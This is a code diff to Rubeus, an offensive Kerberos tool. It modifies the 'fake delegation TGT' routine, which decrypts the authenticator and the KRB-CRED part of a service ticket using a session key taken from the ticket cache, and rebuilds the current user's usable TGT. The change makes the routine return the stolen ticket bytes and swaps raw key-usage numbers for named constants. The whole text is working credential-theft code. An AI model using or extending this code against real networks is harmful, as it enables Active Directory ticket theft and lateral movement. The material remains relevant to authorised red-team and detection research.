@@ -1367,9 +1367,11 @@ namespace Rubeus
             return returnedSessionKey;
         }
 
-        public static void RequestFakeDelegTicket(string targetSPN = "")
+        public static byte[] RequestFakeDelegTicket(string targetSPN = "")
         {
             Console.WriteLine("\r\n[*] Action: Request Fake Delegation TGT (current user)\r\n");
+
+            byte[] finalTGTBytes = null;
 
             if (String.IsNullOrEmpty(targetSPN))
             {
@@ -1378,7 +1380,7 @@ namespace Rubeus
                 if(String.IsNullOrEmpty(domainController))
                 {
                     Console.WriteLine("[X] Error retrieving current domain controller");
-                    return;
+                    return null;
                 }
                 targetSPN = String.Format("HOST/{0}", domainController);
             }
@@ -1465,8 +1467,8 @@ namespace Rubeus
                                             string base64SessionKey = Convert.ToBase64String(key);
                                             Console.WriteLine("[*] Extracted the service ticket session key from the ticket cache: {0}", base64SessionKey);
 
-                                            // KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR == 11 (https://github.com/gentilkiwi/kekeo/blob/fd852374dfcfae4ddf5e19e4d8eeb03833f08963/modules/asn1/kull_m_kerberos_asn1.h)
-                                            byte[] rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, 11, key, encAuthenticator.cipher);
+                                            // KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR = 11
+                                            byte[] rawBytes = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, key, encAuthenticator.cipher);
 
                                             AsnElt asnAuthenticator = AsnElt.Decode(rawBytes, false);
 
@@ -1507,8 +1509,8 @@ namespace Rubeus
                                                                 {
                                                                     byte[] enc_part = elt3.Sub[0].Sub[1].GetOctetString();
 
-                                                                    // KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART == 14
-                                                                    byte[] rawBytes2 = Crypto.KerberosDecrypt(authenticatorEtype, 14, key, enc_part);
+                                                                    // KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART = 14
+                                                                    byte[] rawBytes2 = Crypto.KerberosDecrypt(authenticatorEtype, Interop.KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, key, enc_part);
 
                                                                     // decode the decrypted plaintext enc par and add it to our final cred object
                                                                     AsnElt encKrbCredPartAsn = AsnElt.Decode(rawBytes2, false);
@@ -1526,6 +1528,8 @@ namespace Rubeus
                                                             {
                                                                 Console.WriteLine("      {0}", line);
                                                             }
+
+                                                            finalTGTBytes = kirbiBytes;
                                                         }
                                                     }
                                                     else
@@ -1562,6 +1566,9 @@ namespace Rubeus
                 }
                 // cleanup 1
                 Interop.DeleteSecurityContext(ref ClientContext);
+
+                // cleanup 2
+                //Interop.FreeContextBuffer(ref ClientToken.pBuffers);
             }
             else
             {
@@ -1570,6 +1577,7 @@ namespace Rubeus
 
             // cleanup 2
             Interop.FreeCredentialsHandle(ref phCredential);
+            return finalTGTBytes;
         }
     }
 }
